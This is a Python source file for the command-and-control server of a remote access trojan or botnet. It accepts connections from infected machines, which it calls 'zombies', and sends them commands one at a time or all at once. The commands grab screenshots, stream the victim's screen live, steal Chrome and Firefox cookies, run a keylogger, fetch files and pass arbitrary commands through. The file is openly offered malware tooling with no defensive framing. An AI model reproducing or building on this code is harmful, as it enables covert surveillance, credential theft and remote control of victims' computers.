import socket
import sys
import os
from PyQt5.QtWidgets import QMainWindow, QApplication, QWidget, QLabel, QPushButton, QAction, QMessageBox
from PyQt5.QtGui import QPixmap
from PyQt5.QtCore import QRect, Qt
from threading import Thread
from random import randint
import pyautogui

host =str(input("Enter the host>"))
port =int(input("Enter the port>"))
connt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connt.settimeout(5)
connt.bind((host, port))
connt.listen(5)
allConnections = []
allAddress = []
global wher
wher=0
class Dekstop(QMainWindow):

    def __init__(self):
        super().__init__()
        self.initUI()

    def ChangeImage(self):
        dev_con = allConnections[wher]
        try:
            while True:
                img_bytes =   dev_con.recv(9999999)
                self.pixmap.loadFromData(img_bytes)
                self.label.setScaledContents(True)
                self.label.resize(self.width(), self.height())
                self.label.setPixmap(self.pixmap)
        except :
            QMessageBox.about(self, "ERROR", "[SERVER]: The remote host forcibly terminated the existing connection!")
            dev_con.close()

    def initUI(self):
        self.pixmap = QPixmap()
        self.label = QLabel(self)
        self.label.resize(self.width(), self.height())
        self.setGeometry(QRect(pyautogui.size()[0] // 4, pyautogui.size()[1] // 4, 800, 450))
        self.setFixedSize(self.width(), self.height())
        self.setWindowTitle("[SERVER] Remote Desktop: " + str(randint(99999, 999999)))
        self.start = Thread(target=self.ChangeImage, daemon=True)
        self.start.start()
def getconnections():
    for item in allConnections:
        item.close()
    del allConnections[:]
    del allAddress[:]
    while 1:
        try:
            client, addr = connt.accept()
            client.setblocking(1)
            allConnections.append(client)
            allAddress.append(addr)
        except:
            break
#connect to spesfec zommbe
def accept_con2(index):
    dev_con = allConnections[index]
    commands(dev_con)
    dev_con.close()
#see all zommbes
def allin():
    for i in allAddress:
        print("we are connected to | ID :%s ip %s port %s " %(allAddress.index(i),i[0],i[1]))
#connnect
def socket_creat():
    try:
        global  host
        global  port
        global  connt
        host  = "127.0.0.1"
        port  =  5
        connt =  socket.socket()
        connt.bind((host,port))
        connt.listen(5) #waiting for connnection timeout = 5
    except socket.error as con_er:
        print("can't connnect "+str(con_er))
#accepting connnection
def accept_con():
    dev_con,dev_address = connt.accept()
    print("we are connected to |ip %s port %s " %(dev_address[0],dev_address[1]))
    commands(dev_con)
    dev_con.close()

#run commands
def commands(dev_con):
    while True:
        commander = input("eguo> ")
        if commander == "quit":
            dev_con.close()
            connt.close()
            sys.exit()
        elif(commander =="screenshot"):
            dev_con.send(str.encode(commander))
            message = dev_con.recv(208788)#recieves all messages sent with buffer size
            if message:
                fil = str(input("enter dir_name_save>"))
                with open(fil, 'wb') as file:
                    file.write(message)
                    file.close()
                    print ("saved")
        elif (commander == "ip-info"):
            dev_con.send(str.encode(commander))
            target = str(dev_con.recv(4096),"utf-8")
            target = target.rsplit('\n')
            print (target)
        elif ("dfile" in commander):
            dev_con.send(str.encode(commander))
            target = str(dev_con.recv(4096), "utf-8")
            # while "#" not in target:
            target = target.rstrip('\n')
            print(target)
        elif(commander=="cookies-chrome"):
            dev_con.send(str.encode(commander))
            target = str(dev_con.recv(4096), "utf-8")
            # while "#" not in target:
            target = target.rstrip('\n')
            print(target)
        elif (commander == "cookies-firefox"):
            dev_con.send(str.encode(commander))
            target = str(dev_con.recv(4096), "utf-8")
            # while "#" not in target:
            target = target.rstrip('\n')
            print(target)
        elif (commander == "keylog"):
            dev_con.send(str.encode(commander))
            target = str(dev_con.recv(4096), "utf-8")
            # while "#" not in target:
            target = target.rstrip('\n')
            print(target)
        elif (commander == "screensher"):
            dev_con.send(str.encode(commander))
            app = QApplication(sys.argv)
            ex = Dekstop()
            ex.show()
            sys.exit(app.exec ())
        if len(str.encode(commander)) > 0:
            dev_con.send(str.encode(commander))
           # dev_con.send((commander))
            target = str(dev_con.recv(4096),"utf-8")
            #while "#" not in target:
            target = target.rstrip('\n')
            print(target)
            #dev_con.send(str.encode("\n"))
            #target = target.rstrip('\n')
             #   target = str(dev_con.recv(4096))

#run one commands_in all of the zommbes
def super_zommbe():
    # allin()
    while True:
        commander = input("eguo> ")
        for i in range(len(allConnections)):
            if commander == "quit" or commander=="exit":
                allConnections[i].send(str.encode(commander))
                allConnections[i].close()
                connt.close()
                sys.exit()
            elif (commander == "ip-info"):
                allConnections[i].send(str.encode(commander))
                target = str(allConnections[i].recv(4096), "utf-8")
                target = target.rsplit('\n')
                print ("data from ID :%s ip %s port %s" % (allAddress.index(allAddress[i]), allAddress[i][0], allAddress[i][1]))
                print (target)
            elif ("dfile" in commander):
                allConnections[i].send(str.encode(commander))
                target = str(allConnections[i].recv(4096), "utf-8")
                # while "#" not in target:
                target = target.rstrip('\n')
                print ("data from ID :%s ip %s port %s" % (allAddress.index(allAddress[i]), allAddress[i][0], allAddress[i][1]))
                print(target)
            elif (commander == "cookies-chrome"):
                allConnections[i].send(str.encode(commander))
                target = str(allConnections[i].recv(4096), "utf-8")
                # while "#" not in target:
                target = target.rstrip('\n')
                print ("data from ID :%s ip %s port %s" % (allAddress.index(allAddress[i]), allAddress[i][0], allAddress[i][1]))
                print(target)
            elif (commander == "cookies-firefox"):
                allConnections[i].send(str.encode(commander))
                target = str(allConnections[i].recv(4096), "utf-8")
                # while "#" not in target:
                target = target.rstrip('\n')
                print ("data from ID :%s ip %s port %s" % (allAddress.index(allAddress[i]), allAddress[i][0], allAddress[i][1]))
                print(target)
            elif (commander == "keylog"):
                allConnections[i].send(str.encode(commander))
                target = str(allConnections[i].recv(4096), "utf-8")
                # while "#" not in target:
                target = target.rstrip('\n')
                print ("data from ID :%s ip %s port %s" % (
                allAddress.index(allAddress[i]), allAddress[i][0], allAddress[i][1]))
                print(target)
            if len(str.encode(commander)) > 0:
                allConnections[i].send(str.encode(commander))
                # dev_con.send((commander))
                target = str(allConnections[i].recv(4096), "utf-8")
                # while "#" not in target:
                target = target.rstrip('\n')
                print ("data from ID :%s ip %s port %s" %(allAddress.index(allAddress[i]),allAddress[i][0],allAddress[i][1]))
                print(target)
def main():
    banner ="""@@@@@@@$$$$$$$$$%%%%%%*******************!!!!!::::::::::!!**%%$$$%%%*!!!!!!!!!!!!!!!!!!!********!!!!::::::::::::::!!*%$&
@@@@@@@$$$$$$$$$%%%%%*******************!!!!:::::!!*%$@@@&&#####S###&@$%**!!!!!!!!!!!!!!!!******!!!!::::::::::::::!!*%@#
@@@@@@@$$$$$$$$%%%%%*******************!!!!::!!*$@&&#############SSSSSS#&@$%%***!!!!!!!!!!******!!!!::::::::::::::!!*%@#
@@@@@@@$$$$$$%%%%%%*******************!!!!!!%@@&#####################SSSSS#&&&@$%*****!*********!!!:::::::::::::::!!*%@#
@@@@@@@$$$$$$%%%%%%%*****************!!!!*$@#################SSS#########SSSS##&&&@$%%%%*******!!!!:::::::::::::::!!*%@#
&&@@@@@@$$$$$%%%%%%%%**************!!!!!*@&####SSSSSSSSSSSSSSSS#########S###SS#####&&@@$$$$%%***!!!!::::::::::::::!!*%@#
&&&&@@@@@$$$$$$$%%%%%%%************!!!*%@##SSSSBBBBBBBBBBBBBBBSS############SSSS#####&#&&&&@@$$$%**!!!:::::::::::!!!*%@#
&&&&&&@@@@@$$$$$$$%%%%%%%************%@&##SBBBBBSSBBSSSSSBBSBBS#####&&&#####SSSSSSS###&&&&&&&&&@$%%**!!!:::::::::!!!*%@#
&&&&&&&&@@@@$$$$$$$%%%%%%************$##SBBBS#@&&##SSSSSSSS#####S###&@&&#SSSSSSBSSSS###&&&@@&&&&&@$$%**!!::::::::!!!*%@#
#&&&&&&&&@@@@$$$$$$$%%%%%%%*********$&#SBBB#$%%*%$@&####@$%%%%$$&#SS#&@@&S#SSSSSSSBSSSS##&&&&&@&&&@@@$%*!!!::::::!!!*%@#
#####&&&&&@@@@$$$$$$$$%%%%%%%****%%@&#SBSS#$$@$%**$@$@$%*******%%@&SB#@$@&###S#&&&#SBBSSSSS##&#&&&&&&@@$$*!!!::::!!!*%@&
#####&&&&&@@@@$$$$$$$$$%%%%%%***%%$$&SSSBS$$&&&@*!*%*%%$%*%$&&@$%%$&SBS&@@@&&#&&#&&##SSBBBBSS##&&&&&&&&&&&@%**!::!!**%@&
#####&&&&&&@@@@$$$$$$$$$%%%%%%****%$&&&#S&*$&&@@%!!!*%%**%@&#&&&@$%$@SBSS&#&&@@&&&###SBBBBBSSS##&&@@@&&&&&&&&@%**!!**%@&
####&&&&&&&@@@@@$$$$$$$$$%%%%%*********%@$*$&#&&%!!!**!!!%@&$$@@&$**$#SSBSSSSS#####SSSSBBBBSS####&&&@@&&&@&&&&&&@%**%%$&
###&&&&&&&&@@@@@@@$$$$$$$$$$%%***!!!!!!%@*!*$$%%*!::!!!!*$@@&&&@$*!*$&SBSBSSSSBSSS#BBBBBBBSSSS####&&&&@&#&&&##&###&@$$@&
##&&&&&&&@@@@@@@@@@@$$$$$$$$$%%**!!!!!*%@*!!!!!!!!:::!*!!!**%%%**!:*$&SSSSBBBSSBS#SBBBBBBSSSSS###&&###&&###&&#&&&###&@@&
&&&&&&&&@@@@@@@@@@@@@$$$$$$$$$%***!!!!**$@****%*!::::!***!::!!**!!*$&#SSSSBBBBS##&SBBBBBBBSSSS###&&&###&&##&&&&##&&###&&
&&&&&&&@@@@@@@@@@@@@@$$$$$$$$$%%***!!!!!%&@$@@$!::::!!*%%%*%%$$%%$@&###SSBBBBBBS&&SBBBBBBBSSSS######&&##&&###&&&##&&#S##
&&&&@@@@@@@@@@@@@@@@@$$$$$$$$$%%%********$&&@$!:::::!*%%*$$@@@@@@&##SSSSBBBBBBSSSBBBBBBBBBSSS###################&#######
&&@@@@@@@@@@@@@@@@@@@$$$$$$$$$$%%%%******$&&%!:!!::*%*%**%$@@$$$#SSSSSSSSSBBSSSBBBBBBBBBBSSS############################
&&@@@@@@@@@@@@@$$@@@$$$$$$$$$$$%%%%******%&$*!!**!%#@!%$%%%$$$@&#SSSS#S#SSSBBBBBBBBBBBBBBSSS##&####&#S##################
&@@@@@@@@@@@@@@$$@@@@$$$$$$$$$$$%%%%****%$&@*!****%%!*$$$%%%$&####S#####SSSBBBBBBBBBBBSSB##S##&#####SSSS#SS#S#SS####S###
&@@@@@@@@@@@@@@@$$$$@@$$$$$$$$$$%%%%%***%$#&$*!***%*%@&@$$@@&###S#####SSSBBBBBBBBBBBSSSSS##SS#####S##SSSSSSSS#SSS####SSS
@@@@@@@@@@@@@@$$$$$$$@@@$$$$$$$$$%%%%**%$@##$!:!!*%$&##&&&&#####S###SSSBBBBBBBBBBBBBSSS####SSS###SSS#SSSSSSSSSSSS###SS#S
@@@@@@@@@@@@@@@$$$$$@@@@@$$$$$$$%%%%%*%%@&#&%!*!!*%@&SSSS######S##SSSSBBBBBBBBBBBBBS##SS####SSS##SSSSSSSSSSSSSSSSS##SS#S
@@@@@@@@@@@@@@@@$$$@@@@$$$$$$$$$%%%%%*%$@&#@%@#&$%$@&SSSSS###SSSBBBBBBBBBBBBBBBBBBBS###S#####SSS#SSSSSBBSSSSSSSSSSSS#SSS
@@@@@@@@@@@@@@@@@$@@@$$$$$$$$$$%%%%%**%$@###&@#SB#&@@##S###SSSSSBBBBBBBBBBBBBBBBBBSS###S##SSSSSSSSBBSBSBBSSSSBSSSBSS#SSS
&&@@@@@@@@@@@@@@@@@@@$$$$$$$$%%%%%%***%$&#SSS@$#SBS#@@#########SBBBBBBBBBBBBBBBBSSS#S##S##SSSSSSSSBBBBSSBBSSSBBBBBBS#SSS
&&&&&@@@@@@@@@@@@@@$$$$$$$%%%%%%%*****%$&#SS@*%@&@%@%%&#&&&###SSBBBBBBBBBBBBBBBBSSSSS###S##SSSSBBSBSBBBSBBBSSBBSSBBBSSSB
&&&&&&&&@@@@@@@@@@$$$$$$%%%%%%%%******%@&##&!!**!*@%!$&#&&&###SSSBBBBBBBBBBBBBBBSSSSSS##S#SSSSSBBSBBBBBBSSSSBBSBBBBBBSSB
&&&&&&&&&&@@@@@@$$$$$$%%%%%%%%%*******%@&##&!!!!%@$%@########SBBBBBBBBBBBBBBBBBBBSSS####S#SSSSSBBBBBBBBSBSSSBBBBBBBBBBBS"""
    print (banner)
    print ("opthions:\n1)Accept\n2)list\n3)connect <id>\n4)zommbe\n5)Exit")
    while True:
        choice = str(input("eguo_ph1>"))
        if (choice == "accept" or choice == "1"):
            getconnections()
        elif (choice == "list" or choice == "2"):
            allin()
        elif ("connect" in choice):
            try:
                index = int(choice.replace("connect", "")) - 1
                wher = index
                accept_con2(index)
            except:
                pass
        elif (choice == "3"):
            index = int(input("set the id of the zommbe>"))
            accept_con2(index)
        elif (choice == "zommbe" or choice == "4"):
            # getconnections()
            # allin()
            super_zommbe()
        elif (choice == "exit" or choice == "5"):
            os._exit(1)
        else:
            print ("wrong option")
    # getconnections()
    # super_zommbe()
    #socket_creat()
    #accept_con()
main()